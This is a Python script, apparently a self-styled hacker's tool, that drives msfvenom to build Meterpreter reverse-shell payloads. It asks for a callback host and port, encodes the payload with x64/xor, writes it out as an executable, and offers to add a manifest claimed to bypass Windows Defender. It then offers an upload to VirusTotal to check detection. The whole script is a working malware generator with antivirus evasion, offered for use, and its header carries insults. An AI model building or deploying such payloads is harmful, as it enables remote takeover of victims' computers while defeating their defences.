#/usr/bin/env python3
#Coded By Ali Khan D3V!L HuN73R Bangladeshi Hacker.
#RECORDED? Only Changed And Delete COPYRIGHT? Don't Be A Bastard Dude! if u change or edit it u are fucking idiot and kids.
#I'am a creative genius.

from colorama import Fore								
from colorama import Style	
from time import time as timer	
import time,random
import datetime			   		
import os
import sys

error = 'clear'
os.system(error)


####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 

def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]
    
    x = """
            ____ _____      ______   __  __         __________     
           / __ \__  /   __/  _/ /  / / / /_  _____/__  /__  /_____
          / / / //_ < | / // // /  / /_/ / / / / __ \/ / /_ </ ___/
         / /_/ /__/ / |/ // //_/  / __  / /_/ / / / / /___/ / /    
        /_____/____/|___/___(_)  /_/ /_/\__,_/_/ /_/_//____/_/     
                                                                   
       Just Only One Line Code can Damage Your System  --4|! Kh4N 
            I Can't do Everything But I Can Try ./ALL! K4HN
  (=*=*=*=*=*=*=*=*=*= This is The way to bypass it =*=*=*=*=*=*=*=*=) 

"""   

    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)

now = datetime.datetime.now()
print('\n\033[92m                  STARTED AT: ' + str(now))

print_logo()

try:
   payloadtype = input(" [?] Enter Payload Type windows/x64/meterpreter_reverse : ")

   if payloadtype=="":
      payloadtype="windows/x64/meterpreter_reverse"
   print(" [*]  Using payload  [*] "+payloadtype)

   if "help" in payloadtype:
      print(" [%] Please Wait Opening Payload List [%] ")
      helper = 'msfvenom --list payloads'
      os.system(helper)

      payloadtype = input(" [?] Enter Payload Type windows/x64/meterpreter_reverse : ")

   if payloadtype=="":
      payloadtype="windows/x64/meterpreter_reverse"

      print(" [*]  Using payload  [*] "+payloadtype)

   if "help" in payloadtype:
      print(" [%] Please Wait Opening Payload List [%] ")
      helper = 'msfvenom --list payloads'
      os.system(helper)


   payload_type = input(" [?] Enter Payload TYPE [tcp,https,tcp_dns] : ")

   if payload_type=="":
      payload_type="tcp"
   
   print(" [*]  Using service  [*] "+payload_type)


   lhost = input(" [?] Enter LHOST for Payload [LHOST] : ")

   if lhost=="":
      lhost="127.0.0.1"
   
   print(" [*]  Using lhost  [*] "+lhost)

   lport = input(" [?] Enter LPORT for Payload : ")

   if lport=="":
      lport="4444"
   
   print(" [*]  Using lport  [*] "+lport)

   windowser = input(" [?] Enter Your platform windows or linux : ")

   if windowser=="":
      windowser="windows"
   
   print(" [*]  Using platform windows  [*] "+windowser)

   if "help" in windowser:
      print(" [%] Please Wait Opening Platforms List [%] ")
      platform1 = 'msfvenom --list platforms'
      os.system(platform1)

   virusencoder = input(" [?] Enter Your Encoder x64/xor : ")

   if virusencoder=="":
      virusencoder="x64/xor"

   print(" [*]  Using encoder x64/xor  [*] "+virusencoder)

   if "help" in virusencoder:
      print(" [%] Please Wait Opening Encoder List [%] ")
      encoder = 'msfvenom --list encoders'
      os.system(encoder)

   exe = input(" [?] Enter File Type [ exe , raw , bad , ps] : ")

   if exe=="":
      exe="exe"

   print(" [*]  Using format exe  [*] "+exe)

   hackerexe = input(" [?] Enter Out Put File Nmae :  ")

   if hackerexe=="":
      hackerexe="payload.exe"
  
   print(" [*]  Saveing File as payload.exe  [*] "+exe)

   print("\n [+] Ganarating Payload Please Wait..............")

   raw_payload='msfvenom -p '+payloadtype+'_'+payload_type+' LHOST='+ lhost +' LPORT='+ lport +' EXITFUNC=process --platform '+windowser+' -a x64 -e '+virusencoder+' -f '+exe+' -o '+hackerexe+''

   os.system(raw_payload)

   if hackerexe not in raw_payload :
         erroFound = os.error(raw_payload)
         rooter = print(" [$] Sorry we Can't Create File Check your Command Again [$] \n\n""khan@parrot]─[~]",erroFound)
         sys.exit()

   print(" [@] Do you want to add Manifest (Generally Bypasses Windows Defender [@] ")

   exploiter = input(" [!] Please Type yes or no [!] ")

   if "yes" in exploiter:
      print(" [@] Please Wait Adding Manifest [@] at ",hackerexe)
      man='wine bypasserav.exe -manifest template.exe.manifest -outputresource:'+hackerexe+';#1 '
      os.system(man)

   elif "no" in exploiter:
      print(" [%] OK ... DONE [%] ")
   
   else:
      print(" [%] 010010101001011010101001 [%] ")
   


   #print(raw_payload)

   print(" [+] For Chacking Your Virus Power You Can upload On Virus Total [+] ")
   virusTotal = input(' [+] You Want To Upload [+] type : yes or no ::   ')
   
   if "yes" in virusTotal:
      print(" [+] PLease Wait Uploading is Take a few minutes......... [+] ")
      virusTotal0 = 'msf-virustotal -f '+hackerexe+''
      os.system(virusTotal0)
   elif "no":
      print(" \n\n(=*=*=*=*=*=*=*=*=*= [*] Allah Hafez [*] =*=*=*=*=*=*=*=*=*=)\n\n ")
      sys.exit()
   else:
      print(" \n\n(=*=*=*=*=*=*=*=*=*= [*] Allah Hafez [*] =*=*=*=*=*=*=*=*=*=)\n\n ")
      sys.exit()

except ValueError:
   
   print(" [-] Please Use A Ip Address number [-] ")

except KeyboardInterrupt:

   print("\n\n============================= Quiting =============================\n\n")

   print("\n\n========================= Good BYE =========================\n\n")




